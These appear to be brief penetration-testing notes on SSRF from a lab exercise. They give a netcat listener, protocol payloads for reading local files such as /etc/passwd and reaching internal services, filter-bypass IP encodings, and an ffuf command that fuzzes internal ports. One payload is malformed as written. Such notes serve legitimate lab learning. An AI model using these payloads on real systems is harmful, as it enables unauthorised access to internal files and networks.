nc -lvnp 8000

`connect to your own ip if you see its connected you got ssrf.`
### Common Protocols for SSRF:

- `http://127.0.0.1/file:///etc/passwd` → Access local files.
    
- `gopher://dateserver.htb:80/...` → Use the gopher protocol to send arbitrary requests.
    
- `dict://127.0.0.1:11211/info` → Query dictionary services.
    
- `ftp://127.0.0.1:21` → Access FTP servers.
    
- `file://` → Access local files.
    
- `php://` → PHP stream wrappers (highly dangerous).
    
- `data://` → Data encoding.
    
- `https://` → Accessing internal HTTPS servers.
    

### Advanced SSRF Bypass Techniques:

- **URL Encoding**: `http://127.0.0.1%3A80`
    
- **Double Encoding**: `http://127.0.0.1%253A80`
    
- **Alternative IP Representations**:
    
    - **Octal**: `http://0177.0.0.1`
        
    - **Hexadecimal**: `http://0x7F.0x00.0x00.0x01`
        
    - **IPv6 Abuse**: `http://[::1]:80`
        
- **DNS Rebinding**: Change IP resolutions dynamically.
    
- **Varying Ports**: Bypass filters using different ports.

`fuzz the application for open ports to see which one is open`

    `ffuf -w ./ports.txt -u http://172.17.0.2/index.php \
    `-X POST -H "Content-Type: application/x-www-form-`urlencoded" \
   `-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
    `-fr "Failed to connect to"`